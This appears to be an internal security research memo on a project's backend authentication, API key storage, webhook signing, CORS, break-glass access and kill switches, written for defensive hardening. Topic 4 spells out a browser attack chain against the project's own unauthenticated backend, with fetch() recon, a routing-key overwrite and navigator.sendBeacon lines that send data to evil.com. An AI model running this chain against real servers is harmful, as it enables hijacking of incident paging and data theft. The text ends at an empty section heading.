# INFRA DOMAIN RESEARCH — Backend, Auth, Deployment, and the Production Attack Surface

**Lane:** `lane/domain-research-infra` | **Date:** 6 Oct 2026 | **Mode:** research-only, no code changes, ₹0 operating budget
**Branch base:** origin/main @ 8c0893b | **Raw worker reports:** `docs/planning/research/raw/infra-worker{1,2,3}-*.md`

**Posture:** every topic was researched with two mindsets active — the adversary (how would I steal, replay, forge, or hijack this?) and the operator (panicking at 3 AM, needs it to just work). Every recommendation is implementable at ₹0. Aditya's standing order applied throughout: Jev is used normally/casually; the CONTROL sits across the entire architecture — deterministic mechanisms own the decisions, and nothing is done blindly.

---

## EXECUTIVE FINDINGS (read this first)

Three findings are severe enough to lead the whole document:

1. **The platform server has zero authentication.** The BYOK integrations surface (`/api/v1/integrations/keys` POST/DELETE, `test-page`, `/api/simulate`) accepts requests from anyone who can reach the backend. Combined with the default-`*` CORS, **any website the operator visits can overwrite their PagerDuty routing key from JavaScript** — the browser preflight passes, the POST executes, and subsequent pages go to the attacker. This is not theoretical: the attack chain was walked end-to-end against the actual code.
2. **Kill-switch attribution dies in shadow mode — verified in code.** `src/sentinel/shadow.py` hardcodes `reason="shadow"` in the audit disposition, discarding the causal reason. A kill-switch page flowing through shadow mode is recorded as routine shadow traffic. Emergency actions that look routine are an audit defect by every standard researched.
3. **There is no rotation story anywhere.** BYOK keys, webhook signing secrets — no dual-accept, no overlap window, no forced expiry, no rotation UX. Stripe, PagerDuty, Svix, and GitHub all built rotation into the wire format or the policy; we have neither. This is the single biggest ₹0-implementable upgrade across the whole domain.

The good news, stated honestly: our 300s HMAC replay window is **industry-standard, not weak** (Stripe, Svix, and Slack use exactly 300s with no nonce). The HMAC scheme itself is principled. The gaps are around it — delivery-ID binding, rotation, the missing auth boundary behind CORS, and the missing audit surface.

---

## TOPIC 1 — BYOK DONE RIGHT

### What we do
- User-entered PagerDuty routing keys live in a "user integrations store"; resolution order in `forwarder.py`: explicit `key_resolver` → user integrations store → `PD_ROUTING_KEY` env → ctor default → unconfigured. Per-outbox key pins supported.
- Last-four display in UI; secret values never echoed; key value never logged (only the resolution *source*); `sanitize_error` scrubs keys from error strings.
- Simulated mode short-circuits before key resolution/network. R-2 (UI keys not reaching the production forwarder) and R-3 (unauthenticated `/v2/enqueue`) are fixed.
- **Not present:** no encrypted-at-rest story, no rotation UX, no revocation beyond deleting the value, no key-scoped audit trail ("who used this key, when, for which page"), no compromised-key playbook, no show-once ceremony.

### What the real world does
- **Stripe restricted keys** (`rk_live_…`): per-resource read/write/none permissions; key revealed **only once** after creation; API errors name the missing scope explicitly rather than failing silently. Sources: [jpisgeek/vellum-oracle stripe-app-setup SKILL](https://github.com/jpisgeek/vellum-oracle/blob/HEAD/skills/stripe-app-setup/SKILL.md); [steve-lomnes/cosimo stripe.md](https://github.com/steve-lomnes/cosimo/blob/HEAD/docs/stripe.md).
- **Cloudflare API tokens**: permission + level + resource scoping, optional TTL and client-IP restrictions; value **shown once**, never returned by a later GET. Sources: [0xplayerone/pi-cloudflare SKILL](https://github.com/0xplayerone/pi-cloudflare/blob/HEAD/skills/cloudflare-api-token/SKILL.md); [alos-no/cloudflare.net permissions.md](https://github.com/alos-no/cloudflare.net/blob/HEAD/docs/articles/permissions.md).
- **GitHub PATs**: fine-grained PATs have **no "no expiry" option** (max 1 year) — forced rotation cadence; 30–90-day deliberate rotations. Sources: [microsasa/cli-tools token-rotation.md](https://github.com/microsasa/cli-tools/blob/HEAD/docs/operations/token-rotation.md); [wisechef-ai/loopskill-api github-federation-token-rotation.md](https://github.com/wisechef-ai/loopskill-api/blob/HEAD/docs/runbooks/github-federation-token-rotation.md).
- **Vercel env secrets**: encrypted at rest; **Sensitive** type is write-only after saving (not even their own API returns it); changes tracked in an Activity Log. Sources: [vercel.com/docs/environment-variables](https://vercel.com/docs/environment-variables?ref=blog-hookdeck-vercel); [infisical.com](https://www.infisical.com/blog/managing-vercel-environment-variables-at-scale).
- **1Password Connect / op CLI**: `op run` injects secrets into a subprocess's environment at runtime — never on disk, cleared on exit. Sources: [henrychong-ai/ai 1password SKILL](https://github.com/henrychong-ai/ai/blob/HEAD/claude-code/skills/1password/SKILL.md); [spenserhale/skills 1password-cli](https://github.com/spenserhale/skills/blob/HEAD/skills/1password-cli/SKILL.md).
- **Storage consensus — envelope encryption**: AES-256-GCM, unique DEK per secret, KEK in KMS/HSM or loaded from a secrets manager at deploy time (never a plain `.env`), tenant isolation, rotate on schedule and on incident. Source: [dev.to — corsairdev](http://dev.to/corsairdev/how-to-store-api-credentials-for-ai-agents-without-the-llm-ever-seeing-them-2i5j).

### The gap
| # | What we do | What the best do | Gap |
|---|---|---|---|
| G1 | Store, no stated encryption | AES-256-GCM envelope encryption at rest | **No at-rest encryption** — a store-file copy = full key recovery |
| G2 | Last-four display | Last-four + show-once + write-only-after-save | Show-once and write-only absent |
| G3 | Delete value to revoke | One-click rotate w/ overlap; forced expiry; TTL | **No rotation UX, no forced-expiry nudge** — a 3 AM leak has no runbook |
| G4 | Resolution *source* logged | Activity Log / explicit scope errors | No key-scoped **audit trail** (added/rotated/used-for-which-page/deleted) |
| G5 | `sanitize_error` scrubs keys | Secrets never leave the vault | Good on logs — but no scope-binding |
| G6 | env/ctor fallbacks exist | Separate tokens per app/env; "Never commit" | Silent fallback can mislead: a user may *think* their key is in use when it isn't |

### Principled fix direction (₹0)
1. **At-rest encryption**: wrap stored keys with AES-256-GCM from the already-approved `cryptography` pin (dependency-law exception, decision-logged); envelope shape = per-key random DEK wrapped by KEK; KEK from a `SENTINEL_MASTER_KEY` env var **required in production** (fail-closed if unset). Backups become ciphertext-only.
2. **Write-only store contract**: once saved, the value is never returned by any read API — only last-four. Code-level guarantee.
3. **Rotation UX**: "Rotate" flow (paste new key → old+new both accepted for a configurable overlap, default 24h per Stripe's window → old auto-invalidated); explicit "Revoke"; show-once ceremony at entry. Pure code.
4. **Key-scoped audit log**: append-only entries (added by whom/session, rotated, pin changed, used-for-page with timestamp + dedup ID — never the value, revoked) reusing the existing eventlog machinery. Today we cannot prove to a user their key was only used for their pages — the biggest honesty gap.
5. **Fallback firing alarm**: loud visible warning when resolution falls through to env/ctor default while a user key exists or in production mode. Silent fallback is how misrouted pages happen.
6. **Compromise playbook (docs)**: revoke at the PagerDuty dashboard (one-click on their side) → Sentinel-side revoke → audit-log review → new key entry.

---

## TOPIC 2 — INGEST-ENDPOINT AUTH AT THE EDGE

### What we do
- `X-Sentinel-Timestamp` + `X-Sentinel-Signature: sha256=<hex>`; HMAC-SHA256 over `"<timestamp>.<raw body>"`; `hmac.compare_digest`; `|now − ts| ≤ 300s` (`SIGNATURE_MAX_SKEW_S`).
- Legacy timestamp-less HMAC **rejected in production** (onboarding accepts loudly so migrating senders don't go dark). Fail-closed in production; silence/resolve direction fail-closed in every mode. `/v2/enqueue` + `/webhook/generic` both covered; R-3 fixed the previously-unauthenticated enqueue.
- **Known residual**: 300s window, no nonces; relies on idempotent ingest dedup — a captured request is valid-replayable for up to 5 minutes inside the window.

### What the real world does
- **Stripe**: signed string `"<t>.<raw body>"`; header `Stripe-Signature: t=<unix>,v1=<hex>[,v1=<hex>…]`; default tolerance **300s**; `t` inside the signed string (window authenticated, not advisory); rotation keeps the old secret live up to **24h**, sending one `v1` per active secret — **any matching `v1` accepted** (zero-downtime roll); `v0` test-only, **never** accepted (downgrade-attack prevention). Sources: [duke5am/webhook-signature-verify PROVIDER-SCHEMES.md](https://github.com/duke5am/webhook-signature-verify/blob/HEAD/PROVIDER-SCHEMES.md); [drt-hub/drt-web](https://github.com/drt-hub/drt-web/blob/HEAD/synced-docs/guides/using-webhook-trigger.md); [dsb-117/brainblast](https://github.com/dsb-117/brainblast/blob/HEAD/examples/stripe-privy/components/stripe.md).
- **Svix / Standard Webhooks**: headers `webhook-id`, `webhook-timestamp`, `webhook-signature` (space-delimited `v1,<base64>` list = rotation built into the wire format); signed content **`{webhook-id}.{webhook-timestamp}.{raw body}`** — **the message ID is signed** (ours lacks this); 5-minute rejection; Ed25519 asymmetric mode `v1a`. Sources: [svix/svix-docs why.mdx](https://github.com/svix/svix-docs/blob/HEAD/content/receiving/verifying-payloads/why.mdx); [samber/developer-platform-skills signing-scheme-reference.md](https://github.com/samber/developer-platform-skills/blob/HEAD/skills/webhook-platform-design/references/signing-scheme-reference.md).
- **GitHub**: `X-Hub-Signature-256: sha256=<hex>` over **raw body only — no timestamp**; compensation = dedupe on `X-GitHub-Delivery` (unique per delivery); "never use plain `==`". Source: [duke5am PROVIDER-SCHEMES.md](https://github.com/duke5am/webhook-signature-verify/blob/HEAD/PROVIDER-SCHEMES.md).
- **Slack**: `v0=HMAC-SHA256(secret, "v0:<ts>:<raw body>")`; `|now − ts| > 300s` → reject. Sources: [hookdeck/webhook-skills slack-webhooks SKILL](https://github.com/hookdeck/webhook-skills/blob/HEAD/skills/slack-webhooks/SKILL.md); [orkspace/orkestra security/09-webhook-verification.md](https://github.com/orkspace/orkestra/blob/HEAD/documentation/security/09-webhook-verification.md).
- **PagerDuty v3 webhooks**: `X-PagerDuty-Signature: v1=<hex>,v1=<hex>,…` — raw body only, comma-concatenated **explicitly "to allow for a zero-downtime secret rotation"**. Source: [pagerduty/developer-docs docs/webhooks/04-Signatures.md](https://github.com/pagerduty/developer-docs/blob/HEAD/docs/webhooks/04-Signatures.md).
- **Rotation consensus**: generate new secret → receiver accepts either → provider switches → drain in-flight (5–10 min) → remove old; multi-signature headers are the wire mechanism. Sources: [intense-visions/harness-engineering api-webhook-security SKILL](https://github.com/intense-visions/harness-engineering/blob/HEAD/agents/skills/codex/api-webhook-security/SKILL.md); [himanshu231204/api-engineering-handbook](https://github.com/himanshu231204/api-engineering-handbook/blob/HEAD/docs/09-realtime-and-webhooks/webhook-signature-verification.md).
- **Fail-open vs fail-closed**: the industry failure mode is missing/unset secret → verification silently skipped → endpoint accepts everything. Accepted fix: missing secret in production → **503 + loud log**, bad signature → 401, detailed *why* only in internal logs. Sources: [leonagoel/hybrid-recommender#594](https://github.com/leonagoel/hybrid-recommender/issues/594); [rindogatan/deal-room commit 532e1ee](https://github.com/rindogatan/deal-room/commit/532e1ee4067652d17827e4fcadd48596b72d28d6); [n8n advisory GHSA-5m98-cgcr-xx3q](https://github.com/n8n-io/n8n/security/advisories/GHSA-5m98-cgcr-xx3q) (real CVE: lost secret → fail-open).

### The gap
| # | What we do | What the best do | Gap |
|---|---|---|---|
| G1 | 300s, no nonce, dedup as backstop | 300s is the standard window — but dedup keys on *signed* IDs | Our window is fine; our dedup keys on alert identity, not a *signed* delivery ID |
| G2 | Signed: `<ts>.<raw body>` | Standard Webhooks signs `{id}.{ts}.{body}` | **No signed delivery/nonce ID** — replay with a fresh header can walk past dedupe |
| G3 | One active secret, unknown rotation | Multi-signature headers + dual-accept + 24h overlap | **No zero-downtime rotation** |
| G4 | Fail-closed (stated) | 503 on missing secret + loud log + reason-labeled metrics | Missing-secret path must be verified 503 + instrumented; legacy-mode unreachable in prod by construction |
| G5 | Legacy rejected in prod, loudly accepted in onboarding | Stripe never accepts `v0` in live mode | Onboarding-accept must be provably impossible in production (env-gated, startup-asserted) |
| G6 | Per-endpoint? | Per-endpoint/registration secrets | One global secret ⇒ a leak on either route forces rotating both |

### Principled fix direction (₹0)
1. **Signed delivery ID**: extend the signed string to `<delivery-id>.<timestamp>.<raw body>` with `X-Sentinel-Delivery-Id`; version the scheme explicitly (`v1` prefix, a la Standard Webhooks) so legacy and new are never ambiguous. Replaying with a fresh ID breaks the MAC; replaying with the same ID hits dedup. Zero infra cost.
2. **Multi-secret rotation (wire-level)**: accept multiple `v1=` values; receiver holds `[current, previous]`; drain window 24h default. Pure code.
3. **Fail-closed verification with metrics**: startup-assert production + missing/empty secret → refuse to boot (or 503); instrument `signature_failures_total{reason}` (`missing | malformed_timestamp | stale | invalid | missing_secret`) so the 3 AM operator distinguishes attack from clock skew from misconfig; external responses stay generic; startup-assert onboarding-legacy is off in production.
4. **Per-endpoint secrets**: config-map distinct secrets per route; a leak on the generic webhook doesn't force rotating the enqueue path.
5. **Tolerance as config**: keep 300s default (industry standard), env-configurable; document the NTP requirement.
6. **Receiving-side secret storage**: same treatment as BYOK keys — at-rest encryption, never in code, treat a leaked webhook secret as a leaked API key.

## TOPIC 3 — STATIC-CONSOLE + REAL-BACKEND SPLIT

### What we do
- GitHub Pages serves `/` (prod console, zero fixtures, talks to the operator's self-hosted backend cross-origin) and `/staging/` (pre-rendered JSON, never touches a backend).
- **No auth between console and backend anywhere.** The trust model is implicitly "the backend only listens on the operator's LAN/laptop, so reachability ≈ authorization." Grep-verified: no 401/403, no API key, no token, no session in the platform server.
- The BYOK integrations surface (`/api/v1/integrations/status` GET, `/api/v1/integrations/keys` POST, `/api/v1/integrations/keys/<name>` DELETE, `/api/v1/integrations/simulated` POST, `/api/v1/integrations/test-page` POST) and `/api/simulate` POST are **completely open** to anyone who can reach the backend.
- Honest mitigation: `status()` reports only `configured`/`last4` — key **values are never readable back** through the API. But writes need no credential, so write-only protects nothing. `test-page` can *spend* the stored routing key (discloses `source: "stored"` vs `"env"`).

### What the real world does
- **CORS done correctly = exact-origin allowlist, never `*` in production.** The Fetch spec forbids `*` with credentials (since 2014, all browsers); real starter kits ship fail-closed. Sources: [dev.to — rxkov CORS misconfigurations](https://dev.to/rxkov/cors-misconfiguration-in-apis-why-reflected-origin-plus-credentials-is-the-dangerous-pattern-not-5ip); [vladimirghrejyan/b2b-saas-starter-kit auth docs](https://github.com/vladimirghrejyan/b2b-saas-starter-kit/blob/HEAD/docs/guides/authentication-and-authorization.md).
- **Preflight caching is standard** (`Access-Control-Max-Age` 600–86400s); our 600 is the sane low end. Source: [rakshyak-98/back2basics CORS](https://github.com/rakshyak-98/back2basics/blob/HEAD/Security/CORS%20(Cross%20Origin%20Request%20Sharing).md).
- **Three auth patterns for static-SPA → self-hosted-backend:**
  - **Same-origin reverse proxy (the Grafana pattern):** Grafana serves its static frontend from the backend itself and famously does not support CORS — the documented cross-origin fix is a same-origin proxy. Sources: [dmzubr/grafana-web-proxy](https://github.com/dmzubr/grafana-web-proxy/blob/master/readme.md); [denisgulev/gitops-playground](https://github.com/denisgulev/gitops-playground).
  - **Bearer token in `Authorization` header (the decoupled-SPA pattern):** SPA holds a short-lived token (memory) and sends `Authorization: Bearer <token>`; no cookies, no CSRF problem. Source: [dev.to — devtanmay cookie vs bearer](https://dev.to/devtanmay/cookie-auth-vs-bearer-token-in-express-what-s-the-difference-and-when-to-use-each-4ieh).
  - **BFF cookie sessions:** `HttpOnly; Secure; SameSite=Lax` session cookie; cross-origin needs `SameSite=None; Secure` + `credentials: 'include'` + exact-origin ACAO + synchronizer CSRF tokens on unsafe methods. Sources: [jakobpriesner/culina cookie-auth-and-security SKILL](https://github.com/jakobpriesner/culina/blob/HEAD/.claude/skills/cookie-auth-and-security/SKILL.md); [ice-962464/codex-skill-library browser-storage-security](https://github.com/ice-962464/codex-skill-library/blob/HEAD/browser-storage-security/SKILL.md).
- **Environment separation:** one backend per frontend environment, scoped CORS each way (Vercel/Netlify preview deploys with per-deploy origin allowlists; build-time API URLs; Supabase/Clerk separate projects). Principle: the frontend's origin is a build-time constant per environment; the backend allowlists exactly that origin. Sources: [braboj/demo-sensor-app arc42](https://github.com/braboj/demo-sensor-app/blob/HEAD/docs/arc42/07-deployment-view.md); [ai-powered-multi-cloud-portability docs](https://github.com/pratikshaprabhakarbande/ai-powered-multi-cloud-portability-and-deployment-automation-platform/blob/HEAD/docs/09-deployment-guide.md) ("explicit non-wildcard `CORS_ORIGIN`... The backend refuses to start otherwise").

### The gap
- Our `*` default makes every backend CORS-readable/writable by every website. The honest defense (read data is non-secret observability data) collapses on the write surfaces: any website the operator visits can overwrite their paging keys. Real world pairs exact-origin CORS *with* one of the three auth patterns; we have neither.
- Environment separation is accidental: staging never touches a backend (good), but the prod console's backend URL is operator-typed at runtime while the backend says "yes" to everything — no binding between a console deployment and a backend instance.

### Principled fix direction (₹0)
1. **Flip the CORS default**: `--cors-origins` defaults to `https://adityapagare619.github.io` (the Pages prod console); `*` becomes an explicit opt-in behind `SENTINEL_CORS_INSECURE=1` so it can't happen silently. Preserves one-command self-host DX while failing closed.
2. **Per-install operator token (the REAL boundary)**: at first startup the server generates a random token, prints it once, stores it in the integrations dir; the console's backend setup asks for it once (stored in localStorage); every API request carries `Authorization: Bearer <token>` (preflight already allows that header). Standard decoupled-SPA pattern, ₹0.
3. **Same-origin option**: document serving the static prod console from the backend's own `ui_dir` (code already supports it) — zero CORS, zero extra config — as the recommended local path; Pages only for the hosted-console case.

---

## TOPIC 4 — BEACON EXFILTRATION VIA CORS (THE ACTUAL ATTACK)

### The mechanics, precisely
- **CORS decides *read*, not *send*.** The browser sends the request anyway; CORS decides whether the calling script sees the response. CSRF is about actions that happen because the request was *sent*. Sources: [jondmarien/cert-study cors.mdx](https://github.com/jondmarien/cert-study/blob/HEAD/content/bscp/cors.mdx); [dev.to XSRF explainer](https://Dev.To/saurabh_raj_afaabe1844a4c/understanding-xsrf-protection-in-fetch-vs-axios-14hk).
- **`fetch`/XHR in CORS mode**: with our `ACAO: *`, any site's `fetch('http://backend/api/decisions')` **reads the full response body** — no preflight for simple GETs. `*` permits reads *without* credentials (WHATWG Fetch §3.2.3: `*` + credentials = network error, all browsers since 2014). Source: [dev.to — rxkov](https://dev.to/rxkov/cors-misconfiguration-in-apis-why-reflected-origin-plus-credentials-is-the-dangerous-pattern-not-5ip).
- **`fetch(mode:'no-cors')`, `<img>`, `<script>`**: request sent, response **opaque** — attacker learns only side channels (onload/onerror, timing). XS-Leaks oracles, not data theft. Source: [lu1sdv/skillsmd browser-attacks](https://github.com/lu1sdv/skillsmd/blob/HEAD/vuln-research/references/browser-attacks.md).
- **`navigator.sendBeacon`**: async POST with no response read (MDN: "does not require a response") — the *exfiltration leg*: after `fetch()` reads our API data (allowed by `ACAO: *`), `navigator.sendBeacon('https://evil.com/collect', stolenJSON)` smuggles it off the browser reliably, even as the page unloads. Source: [mdn/content navigator.sendbeacon](https://github.com/mdn/content/blob/main/files/en-us/web/api/navigator/sendbeacon/index.md).
- **The dangerous pattern is NOT `*`**: `ACAO: *` without credentials cannot steal authenticated data in any browser. The dangerous pattern is **origin reflection + `Access-Control-Allow-Credentials: true`** (PortSwigger's classic lab). We don't reflect origins or set `ACAC: true`, so we don't have *that* bug. Sources: [portswigger.net/web-security/cors](https://portswigger.net/web-security/cors); [medium.com — PortSwigger CORS labs walkthrough](https://medium.com/@bhanvararamchoudhary6/exploiting-cors-misconfigurations-complete-walkthrough-of-3-portswigger-labs-bb0c72a29f4c).
- **The wildcard-with-credentials footnote**: `ACAO: *` + `ACAC: true` fails in the browser, but the request still *reached the server* — the structural lesson: **our endpoints act on unauthenticated requests regardless of CORS, so CORS is no barrier at all** (curl/Burp never cared). Source: [dev.to — rxkov](https://dev.to/rxkov/working-cors-misconfigurations-escape-automated-detection-2a8l).

### The concrete attack chain against OUR backend
Assumptions: operator runs the platform server on `http://localhost:8080` (or a LAN IP), console open against it, clicks a link to the attacker's page. Attacker knows the backend port/URL (localhost probing from a web page is trivial and documented).

1. **Recon (read, no preflight).** `await (await fetch('http://localhost:8080/api/v1/integrations/status')).json()` — `ACAO: *` hands the attacker `{"pagerduty_routing_key": {"configured": true, "last4": "…"}, ...}`. Learns: keys exist, providers, operator runs Sentinel. Values are write-only (verified) — nothing secret leaks beyond that.
2. **The payload (write; preflight passes under `*`).** OPTIONS preflight → our handler answers every origin with `ACAO: *` → passes → POST executes → **operator's PagerDuty routing key is now the attacker's**. Subsequent `test-page`/real pages go to the attacker; the operator's incident paging is silently hijacked. No auth required — CORS was never the only hole; there is no auth *behind* it.
3. **Exfiltration leg.** `navigator.sendBeacon('https://evil.com/log', JSON.stringify({status: d}))` — smuggles recon out even as the tab closes. (Beacons are the *outbound* channel; the *read* was enabled by `ACAO: *`.)
4. **What the attacker cannot do**: read key values (write-only API), steal a session (none exists), credentials-reflection attacks (no ACAC/reflection). Non-browser clients never needed CORS — "CORS is not server access control": *our API is unauthenticated; any local process can already do all of this.*

### The "CORS is a placebo" critique — and the real boundary
- **CORS is browser-side read policy, not an auth boundary.** "If your server relies on CORS to restrict access, an attacker does not need to bypass anything. They just run their script outside a browser." Our `*` default is the placebo *inverted*: not that CORS fails to protect us — we have nothing behind it to protect. Tightening CORS alone blocks the *browser-based* chain (the operator's most likely attack vector — a phishing link while the console is open) but fixes nothing non-browser.
- **The real boundary: a credential on every request.** Per-install operator Bearer <redacted> (Topic 3): the server rejects requests without it (401), full stop. CORS becomes defense-in-depth about *whose browser* may ask; the token decides *who gets an answer*. With it: ACAO allowlist blocks foreign browsers (they don't have the token; `ACAC` stays off so ambient cookies never become a confused deputy); `fetch(no-cors)`/`<img>`/beacon writes hit 401 without the `Authorization` header.

### Principled fix direction (₹0)
1. **Exact-origin allowlist defaulting to the Pages console; `*` behind an explicit insecure flag.** Kill the universal preflight: OPTIONS must echo `Vary: Origin` and only approve listed origins — note the current preflight ignores Origin entirely *even in allowlist mode* (always 204 with allow-methods/headers); that's a real code bug to fix in the same change.
2. **Operator Bearer <redacted> on every `/api/*`** (401 without it), generated at first run, entered once in the console's backend setup.
3. Keep `Access-Control-Max-Age: 600` — already sane.
4. CSRF-style hygiene: require `Content-Type: application/json` on POSTs (simple-form POSTs can't set it → 422); consider `Origin`/`Referer` checks on unsafe methods once the allowlist exists.
5. **Never add `Access-Control-Allow-Credentials: true`** — we don't use cookies, and the spec forbids it with `*`.

---

## TOPIC 5 — BREAK-GLASS ACCESS

### What we do
- **Zero mentions of break-glass in `src/` or `docs/`** — confirmed by repo-wide grep. Total, confirmed gap.
- Raw materials we own: dual-attestation policy governance (two humans approve, changes expire, kernel refuses unattested generations), hash-chained `EventLog` with sealed checkpoints, Ed25519 attestation stack (`attestor.py`, `cryptography==44.0.3` pinned). But today there is **no emergency-access path that bypasses normal auth with audit + time bounds + revocation**. If the dual-attestation path is ever unavailable (approvers unreachable, attestation service down), the operator's only options are standing credentials or nothing — with no mechanism distinguishing emergency from routine work, no expiry, no forced review.

### What the real world does
The industry has converged on a strikingly consistent shape:
- **JIT role assigned to nobody; requested, approved, self-expiring.** **Teleport Access Requests**: request a privileged role with a reason; admin approves; roughly an hour; new request after expiry; sessions recorded; audit events shipped off the target machine. Sources: [goteleport.com — granular JIT access](https://goteleport.com/blog/granular-seamless-jit-access-with-teleport/); [goteleport.com — JIT for EKS](https://goteleport.com/learn/just-in-time-access-for-amazon-eks/).
- **Two tiers: broker-mediated for almost everything; last-resort for the identity plane itself.** Tier one = JIT (approval + mandatory after-the-fact review + bounded window + recorded session). Tier two = the account that rebuilds the identity plane (hardware key, secret split across two offline safes, two people present, alarms on a path **that does not run through the normal SSO**). The through-line: *"Any authentication as any break-glass identity, tier one or tier two, pages the security team immediately, because a break-glass account used without an alarm is just a privileged account nobody is watching."* Sources: [mgoodric — break-glass without the backdoor](https://github.com/mgoodric/mattgoodrich.com/blob/HEAD/content/posts/break-glass-without-the-backdoor/index.md); [learningk8s break-glass case study](https://github.com/unpredictableprashant/learningk8s/blob/HEAD/sessions/31-case-studies/subsessions/14-break-glass-admin-access/README.md) (revocation of the access entry as part of incident closure — revocation is a runbook step, not an afterthought).
- **Shamir-split credentials**: minted only after owner approval, held in `tmpfs`/short-lived `ssh-agent` (never disk), 60-minute default TTL, new approval (not silent extension) for longer, keys/temp files destroyed on cleanup, no role escalation, mandatory post-incident review within 24h, hash-chained audit verified after every session. Source: [rmednitzer/core-graph break-glass.md](https://github.com/rmednitzer/core-graph/blob/HEAD/docs/operations/break-glass.md).
- **Revocation's canonical answer: don't trust the credential, trust a server-side check at use time.** AWS cannot cancel temporary credentials — they die only at expiry; the documented revocation is an inline DENY policy keyed on `aws:TokenIssueTime` ("deny all actions for credentials issued before <cutoff>"), evaluated at request time. A token trusted on signature alone is unrevocable — that's the trap. Source: [docs.aws.amazon.com — revoke-sessions](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_revoke-sessions.html).
- **Break-glass produces MORE audit data than normal, under a distinct identity.** PAM doctrine; the `kalitka` pattern binds approval to credential (`key-id` = `kalitka:<session-id>`), `force-command` certs carry only the approved command, expiry intrinsic — "no reconcile/orphan problem at all." Anti-backdoor discipline: quarterly review even if unused; rotate after any use and after personnel changes; alarm on *any* use of the dormant account. Sources: [scworld.com PAM explainer](https://www.scworld.com/tech-explainer/privileged-access-management-vaulting-session-control-and-break-glass); [everycore-net/kalitka README](https://github.com/everycore-net/kalitka/blob/HEAD/deploy/ssh/README.md); [tashiscool gist](https://gist.github.com/tashiscool/c5e57e0b32bb6c48b4eb562fc4dd845a).

### The gap
We have zero of this: no emergency role, no JIT grant, no TTL, no revocation path, no distinct break-glass audit identity, no use-alarm, no mandatory post-incident review.

### Principled fix direction (₹0, minimum design reusing what we own)
1. **`breakglass` role assigned to nobody.** Standing state = dormant; no standing credentials.
2. **Grant = short-lived Ed25519-signed token, dual-control.** Incident ID + exact command/action class (force-command analog — approve the *action*, not a shell) + requester + approver (reuse dual-attestation machinery). TTL 15–60 min; longer requires a new grant, never extension.
3. **Revocation via generation counter, not per-token tracking.** `breakglass_generation` in the control plane; every grant stamped with its birth generation; every privileged action re-checks: signature valid + TTL unexpired + generation == current. Revocation = one write bumping the counter — O(1), kills all live sessions instantly, including mid-flight. (The AWS `TokenIssueTime` lesson generalized: the enforcement point consults live server-side state at use time; the token is never trusted alone.)
4. **Distinct break-glass audit identity.** Log as `actor="breakglass:<incident-id>"` with *more* fields than normal actions, into the hash-chained event log. Never reuse the normal actor identity.
5. **Alarm out-of-band on every use.** The alarm path must not run through Sentinel itself (Sentinel may be the thing on fire).
6. **Mandatory post-incident review within 24h**, written to the log; no re-issue for the same incident ID until the review record exists.
7. **Anti-backdoor rules**: no role escalation; grant material never touches disk (memory/tmpfs); drill quarterly — the emergency shortcut is the thing never rehearsed.

---

## TOPIC 6 — KILL-SWITCH PROPAGATION TO THE FORWARDER

### What we do
- Global kill switch stops ALL suppression (fail-open: everything pages). In-flight races resolve as pages when the switch engages. Drill-verified forwarder halt in <5s, 7/7 PASS (2026-10-05).
- **Attribution dies in shadow mode — verified in code**: `src/sentinel/shadow.py` hardcodes `reason="shadow"` in the shadow audit disposition (`_evaluate_storm_digest` builds `audit_disp` with `reason="shadow"`, discarding the would-be reason). Any kill-switch-caused page flowing through shadow mode is recorded as routine shadow traffic.
- Forwarder anatomy: `DurableForwarder` with outbox, `claim_due_rows`, `_attempt`, `_scheduler_loop`, `drain(timeout_s=30)`, `stop(timeout_s=30)`, `send_direct` degraded path, `_secondary_scan`, `enqueue_control_plane_page`. Multiple delivery paths — the switch must reach *all* of them.

### What the real world does
- **Propagation speed: streaming beats polling by an order of magnitude.** LaunchDarkly server SDKs hold SSE connections; flag changes propagate in **<200ms**. Their guidance: "kill-switch speed is the requirement → realtime updates, not a polling tool." Contrast Statsig: 10s polling default — fine for experiments, not kill switches. Sources: [launchdarkly.com platform-architecture](https://launchdarkly.com/how-it-works/platform-architecture/); [medium.com — feature flag tools compared 2026](https://medium.com/@travisw93/feature-flag-tools-compared-2026-launchdarkly-vs-flagsmith-vs-unleash-vs-configbee-vs-statsig-vs-a19b6f11fe8f).
- **Kill switches stop NEW exposure; in-flight work is separate and explicit.** "The flag is evaluated when a job is processed, so work already in the queue drains under the old answer. Neither statement cancels anything already generated." The principled fix is **snapshot-once-at-entry**: new requests see the new revision; in-flight finishes under the old decision **unless a separate cancellation mechanism is deliberately invoked** — a rollback runbook orders actions explicitly. Sources: [coderxp1/tugpt-nextjs docs](https://github.com/coderxp1/tugpt-nextjs-recovered/blob/HEAD/docs/controlled-rollout.md); [dev.to — boolean middleware checks](https://dev.to/hwpgsd503817/boolean-middleware-checks-feature-flag-control-for-checkout-api-routes-17g7).
- **The generation/epoch trick** is the snapshot-revision made principled: every work item carries its birth generation; the switch bumps it; stale-generation work is dropped/fenced at every checkpoint. Used in durable execution ("consumers record `seen_generation` and ignore anything stale") and as fencing tokens generally. Sources: [forcewake/forge research](https://github.com/forcewake/forge/blob/HEAD/docs/research/2026-09-13-durable-execution.md); [hackernoon — the fencing gap](https://hackernoon.com/the-fencing-gap-why-your-distributed-lock-isnt-safe-and-how-to-fix-it).
- **Trading kill switches are asymmetric and hard to re-arm — by design.** Nasdaq MRX: member request cancels all orders AND restricts new entry; re-entry only after verbal request to Exchange staff. Zerodha retail: re-enable only 12h after disable. Lesson: instant one-sided kill; slow multi-party re-arm. Sources: [sec.gov — MRX 34-87414](https://www.sec.gov/rules/sro/mrx/2019/34-87414-ex5.pdf); [financialexpress — Zerodha kill switch](https://www.financialexpress.com/market/zerodha-kill-switch-making-loss-take-a-break-disable-trading-how-to-use-this-new-katie-feature-2276747/lite/).
- **Graceful drain (Kubernetes)**: endpoint deregistration → `preStop` → `SIGTERM` → drain within `terminationGracePeriodSeconds` → `SIGKILL`; operators size the grace period against a *measured* drain budget. Our `drain(timeout_s=30)`/`stop(timeout_s=30)` is the same shape — but the 30s should be justified against a measured budget, not left as a round number. Sources: [abdelfattah-hilmi blog](https://github.com/abdelfattah-hilmi/portfolio/blob/HEAD/src/pages/blog/zero-downtime-kubernetes-deploys-the-details-nobody-tells-you.md); [kserve/kserve PR #5485](https://github.com/kserve/kserve/pull/5485).

### The gap
